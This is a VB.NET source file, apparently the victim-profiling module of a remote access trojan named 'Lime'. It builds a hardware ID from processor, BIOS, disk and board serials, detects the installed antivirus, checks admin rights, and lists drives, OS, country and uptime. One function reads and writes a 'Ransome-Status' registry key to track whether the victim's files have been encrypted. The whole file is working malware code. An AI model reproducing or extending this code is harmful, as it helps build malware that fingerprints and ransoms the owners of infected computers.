
Namespace Lime
    Public Class ID

        'user name
        Public Shared Function UserName()
            Try
                Return Environment.UserName
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        'bin name
        Public Shared Function BinName()
            Try
                Return IO.Path.GetFileName(Settings.NEXE.Name)
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        'install Date
        Public Shared Function INDATE() As String
            Try
                Return CType(Settings.NEXE, IO.FileInfo).LastWriteTime.ToString("dd/MMM/yyy")
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        'HWID
        Public Shared Function HWID() As String
            Try
                Dim tohash As String = Identifier("Win32_Processor", "ProcessorId")
                tohash += "-" & Identifier("Win32_BIOS", "SerialNumber")
                tohash += "-" & Identifier("Win32_DiskDrive", "Signature")
                tohash += "-" & Identifier("Win32_BaseBoard", "SerialNumber")
                tohash += "-" & Identifier("Win32_VideoController", "Name")
                Return MD5HASH(tohash)
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        Private Shared Function Identifier(ByVal wmiClass As String, ByVal wmiProperty As String) As String
            Try
                Dim result As String = ""
                Dim mc As Management.ManagementClass = New System.Management.ManagementClass(wmiClass)
                Dim moc As Management.ManagementObjectCollection = mc.GetInstances()
                For Each mo As Management.ManagementObject In moc
                    If result = "" Then
                        Try
                            result = mo(wmiProperty).ToString()
                            Exit For
                        Catch
                        End Try
                    End If
                Next
                Return result
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        Public Shared Function MD5HASH(ByVal input As String) As String
            Try
                Dim md5 As Security.Cryptography.MD5CryptoServiceProvider = New Security.Cryptography.MD5CryptoServiceProvider()
                Dim temp As Byte() = md5.ComputeHash(Text.Encoding.UTF8.GetBytes(input))
                Dim sb As Text.StringBuilder = New Text.StringBuilder()
                For i As Integer = 10 To temp.Length - 1
                    sb.Append(temp(i).ToString("x2"))
                Next
                Return sb.ToString().ToUpper()
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        'AV
        Public Shared Function GAV() As String
            Try
                Dim AV_NAME As String = Nothing
                Dim searcher As New Management.ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
                Dim instances As Management.ManagementObjectCollection = searcher.[Get]()
                For Each queryObj As Management.ManagementObject In instances
                    AV_NAME = queryObj("displayName").ToString()
                Next
                If AV_NAME = String.Empty Then AV_NAME = "None"
                AV_NAME = "" & AV_NAME.ToString
                Return AV_NAME
                searcher.Dispose()
            Catch
                Return "Error"
            End Try
        End Function

        'Country
        Public Shared Function GLOC() As String
            Try
                Return Globalization.RegionInfo.CurrentRegion.EnglishName()
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        'os
        Public Shared Function GOS()
            Try
                Return My.Computer.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win")
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        'bit
        Public Shared Function Bit()
            Try
                If Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86") Then
                    Return "x64"
                Else
                    Return "x86"
                End If
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        'GPU
        Public Shared Function GPU()
            Try
                Dim VideoCard As String = String.Empty
                Dim objquery As New Management.ObjectQuery("SELECT * FROM Win32_VideoController")
                Dim objSearcher As New Management.ManagementObjectSearcher(objquery)

                For Each MemObj As Management.ManagementObject In objSearcher.Get
                    VideoCard = VideoCard & (MemObj("Name")) & " "
                Next
                Return VideoCard
            Catch
                Return "Error"
            End Try
        End Function

        'CPU
        Public Shared Function CPU() As String
            Try
                Dim P As New Management.ManagementObject("Win32_Processor.deviceid=""CPU0""")
                P.Get()
                If P("Name").ToString.Contains("Intel") Then
                    Return P("Name").ToString.Replace("(R)", "").Replace("Core(TM)", "").Replace("CPU", "")
                End If
                Return P("Name").ToString
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        'type
        Public Shared Function MachineType()
            Try
                Dim ps As Windows.Forms.PowerStatus = Windows.Forms.SystemInformation.PowerStatus
                Dim batteryStatus As String = ps.BatteryChargeStatus.ToString
                If batteryStatus = "NoSystemBattery" Then
                    Return "Desktop"
                Else
                    Return "Laptop"
                End If
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        'Admin
        Public Shared Function AmiAdmin()
            Try
                Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
                Dim p As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
                If p.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator) Then
                    Return "Administrator"
                Else
                    Return "User"
                End If
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        'driver list
        Public Shared Function ListDrivers()
            Try
                Dim sb As Text.StringBuilder = New Text.StringBuilder()
                For Each drive In Environment.GetLogicalDrives
                    Dim Driver As IO.DriveInfo = New IO.DriveInfo(drive)
                    If Driver.DriveType = IO.DriveType.Fixed Then
                        sb.Append(drive.ToString + " ")
                    End If
                Next
                Return sb.ToString
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        'ransome
        Public Shared Function LV3()
            Try
                If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing) Is Nothing Then
                    My.Computer.Registry.CurrentUser.CreateSubKey("Software\Lime")
                    Return "Not encrypted"
                Else
                    Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing)
                    Return readValue
                End If
            Catch ex As Exception
                Return "Error"
            End Try
        End Function

        'Last reboot
        Public Shared Function LastReboot() As String
            Try
                Dim str As String = Nothing
                Dim since As Double = New Devices.Computer().Clock.TickCount / 1000 / 60
                If since > 60 Then
                    since = since / 60
                    If since > 24 Then
                        since = since / 24
                        str = (CInt(since)).ToString() & " day(s) ago"
                    Else
                        str = (CInt(since)).ToString() & " hour(s) ago"
                    End If
                Else
                    str = (CInt(since)).ToString() & " minute(s) ago"
                End If
                Return str
            Catch ex As Exception
                Return "Error"
            End Try

        End Function
    End Class
End Namespace